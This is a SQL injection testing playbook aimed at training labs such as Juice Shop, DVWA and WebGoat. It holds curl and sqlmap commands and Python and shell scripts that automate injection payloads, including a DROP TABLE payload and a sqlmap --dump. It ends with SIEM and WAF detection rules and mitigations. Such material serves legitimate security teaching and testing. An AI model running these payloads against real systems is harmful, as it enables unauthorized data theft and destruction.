# Playbook 11: SQL Injection Attacks

## Overview

This playbook covers comprehensive SQL injection testing across OWASP Juice Shop, DVWA, XVWA, and WebGoat. It includes detection of various SQL injection types: union-based, boolean-based blind, time-based blind, error-based, and second-order SQL injection.

## Target Applications

- **OWASP Juice Shop**: User login, product search, order tracking
- **DVWA**: SQL Injection sections (Low/Medium/High security)
- **XVWA**: SQL injection challenges and forms
- **WebGoat**: SQL injection lessons and challenges

## Prerequisites

```bash
# Install required tools
pip3 install sqlmap requests beautifulsoup4 urllib3
brew install sqlmap  # macOS alternative

# Clone custom wordlists
git clone https://github.com/danielmiessler/SecLists.git ~/wordlists
```

## Manual Testing Commands

### 1. Basic SQL Injection Detection

```bash
# Test for error-based SQL injection
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\''","password":"password"}'

# Boolean-based blind SQL injection test
curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='1"
curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='2"

# Time-based blind SQL injection
curl "http://localhost:3000/rest/products/search?q=apple'; WAITFOR DELAY '00:00:05'--"
```

### 2. DVWA SQL Injection Testing

```bash
# Low security level
curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit" \
  --cookie "PHPSESSID=your_session; security=low"

# Medium security level (bypass filtering)
curl "http://localhost/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%201,2--&Submit=Submit" \
  --cookie "PHPSESSID=your_session; security=medium"
```

### 3. SQLMap Automated Testing

```bash
# OWASP Juice Shop login bypass
sqlmap -u "http://localhost:3000/rest/user/login" \
  --data='{"email":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --technique=B --level=3 --risk=3

# DVWA parameter testing
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=session_id; security=low" \
  --dbs --dump --batch

# WebGoat SQL injection lesson
sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/attack5a" \
  --data="account=Smith&operator=and&injection=%27" \
  --technique=UB --level=5 --risk=3
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
SQL Injection Testing Framework
Comprehensive SQL injection testing for multiple web applications
"""

import requests
import json
import time
import re
import subprocess
import threading
from urllib.parse import quote, urlencode
from concurrent.futures import ThreadPoolExecutor
import logging

class SQLInjectionTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.results = []
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('sql_injection_results.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def test_juice_shop_sql_injection(self, base_url="http://localhost:3000"):
        """Test SQL injection vulnerabilities in OWASP Juice Shop"""
        self.logger.info("Testing OWASP Juice Shop SQL injection vulnerabilities")

        # SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--"
        ]

        # Test login endpoint
        login_url = f"{base_url}/rest/user/login"
        for payload in payloads:
            try:
                data = {"email": f"admin{payload}", "password": "password"}
                response = self.session.post(login_url, json=data, timeout=10)

                if self.analyze_sql_response(response, payload):
                    self.results.append({
                        'url': login_url,
                        'payload': payload,
                        'method': 'POST',
                        'vulnerable': True,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"SQL injection found: {payload}")

                time.sleep(0.5)  # Rate limiting
            except Exception as e:
                self.logger.error(f"Error testing login: {e}")

        # Test search endpoint
        search_url = f"{base_url}/rest/products/search"
        for payload in payloads:
            try:
                params = {"q": f"apple{payload}"}
                response = self.session.get(search_url, params=params, timeout=10)

                if self.analyze_sql_response(response, payload):
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'method': 'GET',
                        'vulnerable': True,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"SQL injection found in search: {payload}")

                time.sleep(0.5)
            except Exception as e:
                self.logger.error(f"Error testing search: {e}")

    def test_dvwa_sql_injection(self, base_url="http://localhost/dvwa", session_cookie=None):
        """Test SQL injection in DVWA"""
        self.logger.info("Testing DVWA SQL injection vulnerabilities")

        if session_cookie:
            self.session.cookies.update(session_cookie)

        security_levels = ["low", "medium", "high"]

        for level in security_levels:
            self.session.cookies.update({"security": level})
            self.logger.info(f"Testing DVWA security level: {level}")

            # Adjust payloads based on security level
            if level == "low":
                payloads = [
                    "1' OR '1'='1",
                    "1' UNION SELECT 1,2--",
                    "1' UNION SELECT user(),version()--",
                    "1' AND 1=1--",
                    "1' AND 1=2--"
                ]
            elif level == "medium":
                payloads = [
                    "1 OR 1=1",
                    "1 UNION SELECT 1,2",
                    "1 UNION SELECT user(),version()",
                    "1 AND 1=1",
                    "1 AND 1=2"
                ]
            else:  # high
                payloads = [
                    "1' LIMIT 1",
                    "1' ORDER BY 1--",
                    "1' GROUP BY 1--"
                ]

            sqli_url = f"{base_url}/vulnerabilities/sqli/"
            for payload in payloads:
                try:
                    params = {"id": payload, "Submit": "Submit"}
                    response = self.session.get(sqli_url, params=params, timeout=10)

                    if self.analyze_dvwa_response(response, payload, level):
                        self.results.append({
                            'url': sqli_url,
                            'payload': payload,
                            'security_level': level,
                            'vulnerable': True,
                            'response_time': response.elapsed.total_seconds()
                        })
                        self.logger.warning(f"DVWA SQL injection found ({level}): {payload}")

                    time.sleep(0.5)
                except Exception as e:
                    self.logger.error(f"Error testing DVWA: {e}")

    def test_blind_sql_injection(self, url, parameter, base_value="1"):
        """Test for blind SQL injection vulnerabilities"""
        self.logger.info(f"Testing blind SQL injection on {url}")

        # Boolean-based blind SQL injection tests
        true_payload = f"{base_value}' AND '1'='1"
        false_payload = f"{base_value}' AND '1'='2"

        try:
            # Get baseline response
            baseline_response = self.session.get(url, params={parameter: base_value})

            # Test true condition
            true_response = self.session.get(url, params={parameter: true_payload})

            # Test false condition
            false_response = self.session.get(url, params={parameter: false_payload})

            # Analyze responses for differences
            if (len(true_response.content) == len(baseline_response.content) and
                len(false_response.content) != len(baseline_response.content)):

                self.logger.warning("Boolean-based blind SQL injection detected")
                return True

        except Exception as e:
            self.logger.error(f"Error in blind SQL injection test: {e}")

        return False

    def test_time_based_blind_injection(self, url, parameter, base_value="1"):
        """Test for time-based blind SQL injection"""
        self.logger.info(f"Testing time-based blind SQL injection on {url}")

        # Time-based payloads for different databases
        time_payloads = [
            f"{base_value}'; WAITFOR DELAY '00:00:05'--",  # SQL Server
            f"{base_value}' AND SLEEP(5)--",                # MySQL
            f"{base_value}' AND pg_sleep(5)--",             # PostgreSQL
            f"{base_value}' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS x)>2 AND SLEEP(5)--"
        ]

        for payload in time_payloads:
            try:
                start_time = time.time()
                response = self.session.get(url, params={parameter: payload}, timeout=10)
                end_time = time.time()

                response_time = end_time - start_time

                if response_time >= 4:  # Allow some tolerance
                    self.logger.warning(f"Time-based blind SQL injection detected: {payload}")
                    self.results.append({
                        'url': url,
                        'payload': payload,
                        'type': 'time_based_blind',
                        'response_time': response_time,
                        'vulnerable': True
                    })
                    return True

            except requests.exceptions.Timeout:
                self.logger.warning("Request timeout - possible time-based injection")
                return True
            except Exception as e:
                self.logger.error(f"Error in time-based test: {e}")

        return False

    def analyze_sql_response(self, response, payload):
        """Analyze response for SQL injection indicators"""
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "sqlite_step",
            "postgresql",
            "ora-",
            "microsoft jet database",
            "odbc microsoft access",
            "microsoft ole db provider",
            "unclosed quotation mark",
            "quoted string not properly terminated"
        ]

        response_text = response.text.lower()

        # Check for SQL error messages
        for error in sql_errors:
            if error in response_text:
                return True

        # Check for time-based injection (response time > 4 seconds)
        if response.elapsed.total_seconds() > 4:
            return True

        # Check status code anomalies
        if response.status_code == 500:
            return True

        return False

    def analyze_dvwa_response(self, response, payload, security_level):
        """Analyze DVWA-specific responses"""
        response_text = response.text.lower()

        # Look for successful injection indicators
        success_indicators = [
            "first name:",
            "surname:",
            "user()",
            "version()",
            "database()"
        ]

        for indicator in success_indicators:
            if indicator in response_text:
                return True

        return self.analyze_sql_response(response, payload)

    def run_sqlmap_automation(self, targets):
        """Run SQLMap against multiple targets"""
        self.logger.info("Running SQLMap automation")

        sqlmap_results = []

        for target in targets:
            try:
                cmd = [
                    "sqlmap",
                    "-u", target['url'],
                    "--batch",
                    "--level", "3",
                    "--risk", "3",
                    "--technique", "BEUST",
                    "--timeout", "10",
                    "--retries", "2"
                ]

                if target.get('data'):
                    cmd.extend(["--data", target['data']])

                if target.get('headers'):
                    for header, value in target['headers'].items():
                        cmd.extend(["--header", f"{header}: {value}"])

                if target.get('cookies'):
                    cmd.extend(["--cookie", target['cookies']])

                self.logger.info(f"Running SQLMap: {' '.join(cmd)}")

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                sqlmap_results.append({
                    'target': target['url'],
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                })

                if "injectable" in result.stdout.lower():
                    self.logger.warning(f"SQLMap found injection in {target['url']}")

            except subprocess.TimeoutExpired:
                self.logger.warning(f"SQLMap timeout for {target['url']}")
            except Exception as e:
                self.logger.error(f"SQLMap error: {e}")

        return sqlmap_results

    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_tests': len(self.results),
            'vulnerabilities_found': len([r for r in self.results if r.get('vulnerable')]),
            'results': self.results
        }

        # Save JSON report
        with open('sql_injection_report.json', 'w') as f:
            json.dump(report, f, indent=2)

        # Generate HTML report
        html_report = self.generate_html_report(report)
        with open('sql_injection_report.html', 'w') as f:
            f.write(html_report)

        self.logger.info(f"Report generated: {report['vulnerabilities_found']} vulnerabilities found")
        return report

    def generate_html_report(self, report):
        """Generate HTML vulnerability report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>SQL Injection Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #f44336; color: white; padding: 10px; }}
                .summary {{ background-color: #f0f0f0; padding: 10px; margin: 10px 0; }}
                .vulnerability {{ background-color: #ffebee; border-left: 4px solid #f44336; padding: 10px; margin: 10px 0; }}
                .safe {{ background-color: #e8f5e8; border-left: 4px solid #4caf50; padding: 10px; margin: 10px 0; }}
                code {{ background-color: #f5f5f5; padding: 2px 4px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>SQL Injection Security Assessment Report</h1>
                <p>Generated: {report['timestamp']}</p>
            </div>

            <div class="summary">
                <h2>Executive Summary</h2>
                <p><strong>Total Tests:</strong> {report['total_tests']}</p>
                <p><strong>Vulnerabilities Found:</strong> {report['vulnerabilities_found']}</p>
                <p><strong>Risk Level:</strong> {'HIGH' if report['vulnerabilities_found'] > 0 else 'LOW'}</p>
            </div>
        """

        for result in report['results']:
            if result.get('vulnerable'):
                html += f"""
                <div class="vulnerability">
                    <h3>SQL Injection Vulnerability</h3>
                    <p><strong>URL:</strong> {result['url']}</p>
                    <p><strong>Payload:</strong> <code>{result['payload']}</code></p>
                    <p><strong>Method:</strong> {result.get('method', 'N/A')}</p>
                    <p><strong>Response Time:</strong> {result.get('response_time', 'N/A')}s</p>
                </div>
                """

        html += """
        </body>
        </html>
        """

        return html

def main():
    tester = SQLInjectionTester()

    # Test OWASP Juice Shop
    tester.test_juice_shop_sql_injection()

    # Test DVWA (requires session cookie)
    # tester.test_dvwa_sql_injection(session_cookie={"PHPSESSID": "your_session_id"})

    # Test blind SQL injection
    tester.test_blind_sql_injection("http://localhost:3000/rest/products/search", "q")

    # Test time-based blind injection
    tester.test_time_based_blind_injection("http://localhost:3000/rest/products/search", "q")

    # SQLMap automation targets
    sqlmap_targets = [
        {
            "url": "http://localhost:3000/rest/user/login",
            "data": '{"email":"test","password":"test"}',
            "headers": {"Content-Type": "application/json"}
        },
        {
            "url": "http://localhost:3000/rest/products/search?q=test"
        }
    ]

    tester.run_sqlmap_automation(sqlmap_targets)

    # Generate final report
    report = tester.generate_report()

    print(f"\n{'='*60}")
    print("SQL INJECTION TEST COMPLETE")
    print(f"{'='*60}")
    print(f"Total vulnerabilities found: {report['vulnerabilities_found']}")
    print("Reports saved:")
    print("- sql_injection_report.json")
    print("- sql_injection_report.html")
    print("- sql_injection_results.log")

if __name__ == "__main__":
    main()
```

## Shell Script Automation

```bash
#!/bin/zsh
# SQL Injection Testing Automation Script
# Supports OWASP Juice Shop, DVWA, XVWA, and WebGoat

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
JUICE_SHOP_URL="http://localhost:3000"
DVWA_URL="http://localhost/dvwa"
WEBGOAT_URL="http://localhost:8080/WebGoat"
XVWA_URL="http://localhost/xvwa"

# Results directory
RESULTS_DIR="sql_injection_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

echo -e "${BLUE}Starting SQL Injection Testing Suite${NC}"
echo "Results will be saved to: $RESULTS_DIR"

# Function to test basic SQL injection
test_basic_sql_injection() {
    local url=$1
    local parameter=$2
    local test_value=$3

    echo -e "${YELLOW}Testing basic SQL injection on $url${NC}"

    # Common SQL injection payloads
    local payloads=(
        "' OR '1'='1"
        "' OR '1'='1'--"
        "' OR '1'='1'/*"
        "admin'--"
        "' UNION SELECT NULL--"
        "'; DROP TABLE users--"
    )

    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload"

        if [[ "$parameter" == "json" ]]; then
            # JSON POST request
            response=$(curl -s -w "%{http_code}" -X POST "$url" \
                -H "Content-Type: application/json" \
                -d "{\"email\":\"admin$payload\",\"password\":\"test\"}" \
                -o "$RESULTS_DIR/response_$(echo $payload | tr ' /' '_').html")
        else
            # GET request with parameters
            encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
            response=$(curl -s -w "%{http_code}" \
                "$url?$parameter=$test_value$encoded_payload" \
                -o "$RESULTS_DIR/response_$(echo $payload | tr ' /' '_').html")
        fi

        # Check for SQL error indicators
        if grep -qi -E "(sql|mysql|sqlite|postgresql|ora-|database)" \
           "$RESULTS_DIR/response_$(echo $payload | tr ' /' '_').html" 2>/dev/null; then
            echo -e "${RED}[VULNERABLE] SQL injection detected with payload: $payload${NC}"
            echo "$url - $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
        elif [[ "$response" == "500" ]]; then
            echo -e "${YELLOW}[POTENTIAL] Server error (500) with payload: $payload${NC}"
            echo "$url - $payload (500 error)" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
        else
            echo -e "${GREEN}[SAFE] No injection detected${NC}"
        fi

        sleep 0.5  # Rate limiting
    done
}

# Function to test time-based blind SQL injection
test_time_based_injection() {
    local url=$1
    local parameter=$2
    local base_value=$3

    echo -e "${YELLOW}Testing time-based blind SQL injection${NC}"

    # Time-based payloads
    local time_payloads=(
        "'; WAITFOR DELAY '00:00:05'--"
        "' AND SLEEP(5)--"
        "' AND pg_sleep(5)--"
        "' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS x) > 1 AND SLEEP(5)--"
    )

    for payload in "${time_payloads[@]}"; do
        echo "Testing time-based payload: $payload"

        start_time=$(date +%s)

        if [[ "$parameter" == "json" ]]; then
            curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/json" \
                -d "{\"email\":\"admin$payload\",\"password\":\"test\"}" \
                > /dev/null 2>&1
        else
            encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
            curl -s -m 10 "$url?$parameter=$base_value$encoded_payload" \
                > /dev/null 2>&1
        fi

        end_time=$(date +%s)
        duration=$((end_time - start_time))

        if [[ $duration -ge 4 ]]; then
            echo -e "${RED}[VULNERABLE] Time-based SQL injection detected! Response time: ${duration}s${NC}"
            echo "$url - Time-based injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
        else
            echo -e "${GREEN}[SAFE] Normal response time: ${duration}s${NC}"
        fi

        sleep 1
    done
}

# Function to run SQLMap automation
run_sqlmap_tests() {
    echo -e "${YELLOW}Running SQLMap automated tests${NC}"

    # OWASP Juice Shop SQLMap tests
    echo "Testing OWASP Juice Shop with SQLMap..."
    sqlmap -u "$JUICE_SHOP_URL/rest/user/login" \
        --data='{"email":"test","password":"test"}' \
        --headers="Content-Type: application/json" \
        --batch --level=3 --risk=3 --technique=B \
        --output-dir="$RESULTS_DIR/sqlmap_juice_shop" 2>/dev/null || true

    sqlmap -u "$JUICE_SHOP_URL/rest/products/search?q=test" \
        --batch --level=3 --risk=3 \
        --output-dir="$RESULTS_DIR/sqlmap_juice_shop_search" 2>/dev/null || true

    # DVWA SQLMap tests (if available)
    if curl -s "$DVWA_URL" > /dev/null 2>&1; then
        echo "Testing DVWA with SQLMap..."
        sqlmap -u "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
            --cookie="security=low" \
            --batch --level=2 --risk=2 \
            --output-dir="$RESULTS_DIR/sqlmap_dvwa" 2>/dev/null || true
    fi

    # WebGoat SQLMap tests (if available)
    if curl -s "$WEBGOAT_URL" > /dev/null 2>&1; then
        echo "Testing WebGoat with SQLMap..."
        sqlmap -u "$WEBGOAT_URL/SqlInjection/attack5a" \
            --data="account=Smith&operator=and&injection=test" \
            --batch --level=2 --risk=2 \
            --output-dir="$RESULTS_DIR/sqlmap_webgoat" 2>/dev/null || true
    fi
}

# Function to test boolean-based blind SQL injection
test_boolean_blind_injection() {
    local url=$1
    local parameter=$2
    local base_value=$3

    echo -e "${YELLOW}Testing boolean-based blind SQL injection${NC}"

    # Get baseline response
    baseline_length=$(curl -s "$url?$parameter=$base_value" | wc -c)

    # Test true condition
    true_payload="$base_value' AND '1'='1"
    encoded_true=$(echo "$true_payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
    true_length=$(curl -s "$url?$parameter=$encoded_true" | wc -c)

    # Test false condition
    false_payload="$base_value' AND '1'='2"
    encoded_false=$(echo "$false_payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
    false_length=$(curl -s "$url?$parameter=$encoded_false" | wc -c)

    echo "Baseline length: $baseline_length"
    echo "True condition length: $true_length"
    echo "False condition length: $false_length"

    if [[ $true_length -eq $baseline_length && $false_length -ne $baseline_length ]]; then
        echo -e "${RED}[VULNERABLE] Boolean-based blind SQL injection detected!${NC}"
        echo "$url - Boolean-based blind injection" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
    elif [[ $true_length -ne $false_length ]]; then
        echo -e "${YELLOW}[POTENTIAL] Response length differences detected${NC}"
        echo "$url - Potential boolean-based injection" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
    else
        echo -e "${GREEN}[SAFE] No boolean-based injection detected${NC}"
    fi
}

# Main testing function
main() {
    echo -e "${BLUE}SQL Injection Testing Suite Started${NC}"
    echo "Timestamp: $(date)"
    echo "Results directory: $RESULTS_DIR"

    # Test OWASP Juice Shop
    if curl -s "$JUICE_SHOP_URL" > /dev/null 2>&1; then
        echo -e "\n${BLUE}Testing OWASP Juice Shop${NC}"
        test_basic_sql_injection "$JUICE_SHOP_URL/rest/user/login" "json" ""
        test_basic_sql_injection "$JUICE_SHOP_URL/rest/products/search" "q" "apple"
        test_time_based_injection "$JUICE_SHOP_URL/rest/products/search" "q" "apple"
        test_boolean_blind_injection "$JUICE_SHOP_URL/rest/products/search" "q" "apple"
    else
        echo -e "${YELLOW}OWASP Juice Shop not accessible at $JUICE_SHOP_URL${NC}"
    fi

    # Test DVWA
    if curl -s "$DVWA_URL" > /dev/null 2>&1; then
        echo -e "\n${BLUE}Testing DVWA${NC}"
        test_basic_sql_injection "$DVWA_URL/vulnerabilities/sqli/" "id" "1"
        test_time_based_injection "$DVWA_URL/vulnerabilities/sqli/" "id" "1"
        test_boolean_blind_injection "$DVWA_URL/vulnerabilities/sqli/" "id" "1"
    else
        echo -e "${YELLOW}DVWA not accessible at $DVWA_URL${NC}"
    fi

    # Test WebGoat
    if curl -s "$WEBGOAT_URL" > /dev/null 2>&1; then
        echo -e "\n${BLUE}Testing WebGoat${NC}"
        test_basic_sql_injection "$WEBGOAT_URL/SqlInjection/attack5a" "account" "Smith"
    else
        echo -e "${YELLOW}WebGoat not accessible at $WEBGOAT_URL${NC}"
    fi

    # Run SQLMap automation
    if command -v sqlmap >/dev/null 2>&1; then
        echo -e "\n${BLUE}Running SQLMap Automation${NC}"
        run_sqlmap_tests
    else
        echo -e "${YELLOW}SQLMap not installed, skipping automated tests${NC}"
    fi

    # Generate summary report
    echo -e "\n${BLUE}Generating Summary Report${NC}"

    if [[ -f "$RESULTS_DIR/vulnerable_endpoints.txt" ]]; then
        vulnerable_count=$(wc -l < "$RESULTS_DIR/vulnerable_endpoints.txt")
        echo -e "${RED}Vulnerable endpoints found: $vulnerable_count${NC}"
        echo "Vulnerable endpoints:"
        cat "$RESULTS_DIR/vulnerable_endpoints.txt"
    else
        echo -e "${GREEN}No confirmed vulnerabilities found${NC}"
    fi

    if [[ -f "$RESULTS_DIR/potential_vulnerabilities.txt" ]]; then
        potential_count=$(wc -l < "$RESULTS_DIR/potential_vulnerabilities.txt")
        echo -e "${YELLOW}Potential vulnerabilities: $potential_count${NC}"
        echo "Potential vulnerabilities:"
        cat "$RESULTS_DIR/potential_vulnerabilities.txt"
    fi

    echo -e "\n${BLUE}Testing complete. Results saved to: $RESULTS_DIR${NC}"
    echo "Key files:"
    echo "- vulnerable_endpoints.txt: Confirmed SQL injection vulnerabilities"
    echo "- potential_vulnerabilities.txt: Potential issues requiring manual review"
    echo "- sqlmap_*: SQLMap automated test results"
    echo "- response_*.html: HTTP response captures"
}

# Check dependencies
check_dependencies() {
    echo "Checking dependencies..."

    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Error: curl is required but not installed${NC}"
        exit 1
    fi

    if ! command -v sqlmap >/dev/null 2>&1; then
        echo -e "${YELLOW}Warning: sqlmap not found. Install with: brew install sqlmap${NC}"
    fi

    echo -e "${GREEN}Dependencies check complete${NC}"
}

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}Cleaning up temporary files...${NC}"
    # Remove any temporary files if needed
    echo -e "${GREEN}Cleanup complete${NC}"
}

# Set trap for cleanup
trap cleanup EXIT

# Run dependency check and main function
check_dependencies
main

echo -e "\n${GREEN}SQL Injection testing suite completed successfully!${NC}"
```

## Detection and Monitoring

### SIEM Rules for SQL Injection Detection

```sql
-- Splunk Detection Rule
index=web_logs
| regex _raw="(?i)(union|select|insert|delete|drop|update|exec|script|javascript|vbscript)"
| regex _raw="(?i)(\s|%20)(or|and)(\s|%20).*(\s|%20)*=(\s|%20)*"
| eval sql_injection_score=0
| eval sql_injection_score=if(match(_raw,"(?i)(union|select)"),sql_injection_score+3,sql_injection_score)
| eval sql_injection_score=if(match(_raw,"(?i)(insert|delete|drop|update)"),sql_injection_score+5,sql_injection_score)
| eval sql_injection_score=if(match(_raw,"(?i)(exec|script)"),sql_injection_score+4,sql_injection_score)
| eval sql_injection_score=if(match(_raw,"(?i)(\s|%20)(or|and)(\s|%20).*="),sql_injection_score+2,sql_injection_score)
| where sql_injection_score >= 3
| stats count by src_ip, uri_path, user_agent
| sort -count
```

### WAF Rules (ModSecurity)

```apache
# SQL Injection Prevention Rules
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"

# Block common SQL injection patterns
SecRule ARGS "@rx (?i:(?:[\s'`´'']+(?:select|union|insert|update|delete|drop|create|alter|exec|execute)\s)|(?:\s(?:or|and)\s+(?:\w+\s*)?[=<>]+\s*(?:\w+|'[^']*'|\d+))|(?:(?:union|select|insert|update|delete|drop|create|alter|exec|execute)\s+(?:\*|[\w,\s]+)\s+(?:from|into|values|set|where|group|order|having|limit)))" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Pattern Detected',\
    tag:'attack-sqli'"
```

## Mitigation Strategies

### 1. Use Parameterized Queries/Prepared Statements

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)

# Secure code
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

### 2. Input Validation and Sanitization

```python
import re
from html import escape

def validate_input(user_input, input_type="general"):
    """Validate and sanitize user input"""

    # Remove null bytes
    user_input = user_input.replace('\x00', '')

    if input_type == "username":
        # Allow only alphanumeric and underscore
        if not re.match("^[a-zA-Z0-9_]+$", user_input):
            raise ValueError("Invalid username format")

    elif input_type == "email":
        # Basic email validation
        if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", user_input):
            raise ValueError("Invalid email format")

    # HTML escape for output
    return escape(user_input)
```

### 3. Database Security Configuration

```sql
-- Create limited privilege user for application
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_database.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;

-- Remove dangerous stored procedures
DROP PROCEDURE IF EXISTS xp_cmdshell;
DROP PROCEDURE IF EXISTS sp_OACreate;
```

## Legal and Ethical Considerations

⚠️ **IMPORTANT DISCLAIMERS:**

1. **Authorization Required**: Only test applications you own or have explicit written permission to test
2. **Scope Limitations**: Stay within the defined scope of testing
3. **Data Protection**: Do not access, modify, or exfiltrate real user data
4. **Responsible Disclosure**: Report vulnerabilities through proper channels
5. **Legal Compliance**: Ensure testing complies with local laws and regulations

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLMap User Manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [NIST SP 800-53 Security Controls](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

**Last Updated**: May 27, 2025  
**Version**: 1.0  
**Classification**: Internal Use Only
